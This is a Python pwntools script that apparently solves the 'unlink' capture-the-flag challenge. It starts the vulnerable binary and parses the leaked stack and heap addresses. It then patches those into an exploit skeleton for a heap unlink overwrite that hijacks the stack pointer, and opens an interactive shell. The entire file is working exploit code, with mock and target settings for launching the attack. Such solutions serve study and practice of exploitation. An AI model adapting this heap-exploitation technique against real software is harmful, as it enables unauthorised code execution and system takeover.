#! /usr/bin/python
from __future__ import print_function
import struct
import re
import sys
import pwn as pwntools

class TARGET:
    UNLINK_PATH = "/home/unlink/unlink"
    EXPLOIT_SKELETON = "exploit_skeleton"
    OFFSET_HEAP_A_TO_B = 0x18

class MOCK:
    UNLINK_PATH = "./unlink"
    EXPLOIT_SKELETON = "exploit_skeleton_mock"
    OFFSET_HEAP_A_TO_B = 0x20

MAGIC_BBUF_PLUS_ESP_TWEAK = b"\xef\xbe\xad\xde"
MAGIC_STACK_VAR = b"\xbe\xba\xfe\xca"
OFFSET_LINK_BUF = 0x8
OFFSET_STACK_A_TO_ESP_BKP = 0x10
ESP_TWEAK_WHEN_RESTORED = -0x4
   
def main():
    #load environment-dependent parameters
    env = getenv()

    #start process and get problem parameters
    p = pwntools.process(env.UNLINK_PATH)
    stack_leak = yoink_hexnum(p.recvline())
    heap_leak = yoink_hexnum(p.recvline())
    while b"shell" not in p.recvline(): 
        pass

    #compute exploit
    with open(env.EXPLOIT_SKELETON,"rb") as fh:
        exploit = fh.read()
    b_buf = heap_leak + env.OFFSET_HEAP_A_TO_B + OFFSET_LINK_BUF
    stack_var = stack_leak + OFFSET_STACK_A_TO_ESP_BKP
    magic_to_replace = [
            (
                MAGIC_BBUF_PLUS_ESP_TWEAK,
                struct.pack("<I", b_buf-ESP_TWEAK_WHEN_RESTORED)
            ),
            (
                MAGIC_STACK_VAR,
                struct.pack("<I", stack_var)
            )
    ]
    for (magic, replacement) in magic_to_replace:
        exploit = exploit.replace(magic, replacement)
   
    #send exploit and allow attacker to interact with shell
    p.sendline(exploit)
    p.interactive()

def yoink_hexnum(buf):
    hex_string = re.search(b"0x[0-9a-fA-F]+",buf).group(0).decode("utf8")
    return int(hex_string,16)

def getenv():
    envs = {"target": TARGET, "mock": MOCK}
    if len(sys.argv) < 2 or sys.argv[1] not in envs:
        print("use: ./solution.py mock, or: ./solution.py target")
        exit(1)
    return envs[sys.argv[1]]
        
if  __name__ == "__main__":
    main()
